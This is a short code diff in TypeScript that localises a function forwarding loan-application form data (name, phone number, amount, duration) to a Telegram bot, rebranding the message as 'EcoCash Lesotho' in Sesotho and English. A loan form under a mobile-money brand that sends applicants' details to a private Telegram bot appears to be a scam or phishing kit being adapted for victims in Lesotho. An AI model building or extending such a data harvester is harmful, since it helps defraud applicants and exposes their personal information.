@@ -14,14 +14,15 @@ export const sendToTelegram = async (data: FormData): Promise<void> => {
   }
 
   const message = `
-🎯 New Loan Application - EcoCash
+🎯 Kopo e Ncha ea Kadimo - EcoCash Lesotho
+   New Loan Application - EcoCash Lesotho
 
-👤 Name: ${data.name}
-📱 Phone: ${data.phone}
-💰 Amount: $${data.amount}
-📅 Duration: ${data.duration} month(s)
+👤 Lebitso (Name): ${data.name}
+📱 Nomoro ea Mohala (Phone): ${data.phone}
+💰 Chelete (Amount): LSL ${data.amount}
+📅 Nako ea ho Lefa (Duration): ${data.duration} month(s)
 
-📍 Submitted: ${new Date().toLocaleString()}
+📍 E romelitsoe (Submitted): ${new Date().toLocaleString()}
   `.trim()
 
   const url = `https://api.telegram.org/bot${botToken}/sendMessage`
